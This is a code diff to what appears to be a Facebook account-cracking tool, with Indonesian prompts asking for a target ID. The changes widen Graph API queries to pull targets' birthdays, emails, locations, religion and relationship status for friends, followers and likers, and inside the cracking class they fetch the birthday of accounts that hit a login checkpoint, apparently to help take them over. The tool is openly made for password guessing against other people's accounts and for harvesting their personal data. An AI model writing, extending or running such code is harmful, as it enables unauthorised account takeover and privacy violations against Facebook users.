@@ -234,7 +234,7 @@ def _publik_dev_(_tok_dev_):
     _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
     _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
     try:
-        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
+        _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
         _jso_tar_ = _js_lo_(_req_tar_.text)
         _name_    = _jso_tar_['name']
         _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
@@ -266,7 +266,7 @@ def _followers_dev_(_tok_dev_):
     _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
     _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
     try:
-        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
+        _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
         _jso_tar_ = _js_lo_(_req_tar_.text)
         _name_    = _jso_tar_['name']
         _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
@@ -298,7 +298,7 @@ def _likers_dev_(_tok_dev_):
     _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
     _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
     try:
-        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
+        _req_tar_ = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(_target_dev_,_tok_dev_))
         _jso_tar_ = _js_lo_(_req_tar_.text)
         _name_    = _jso_tar_['name']
         _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
@@ -500,7 +500,7 @@ class _crack_dev_:
                 log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                 if log.get("status")=="cp":
                     try:
-                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
+                        ke = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(fl.get("id"),_dapunta_dapunta_("token.txt","r").read()))
                         tt = json.loads(ke.text)
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
@@ -534,7 +534,7 @@ class _crack_dev_:
                 log = log_mbasic(fl.get("id"),i,"https://mbasic.facebook.com")
                 if log.get("status")=="cp":
                     try:
-                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
+                        ke = _req_get_("https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s"%(fl.get("id"),_dapunta_dapunta_("token.txt","r").read()))
                         tt = json.loads(ke.text)
                         ttl = tt["birthday"]
                         m,d,y = ttl.split("/")
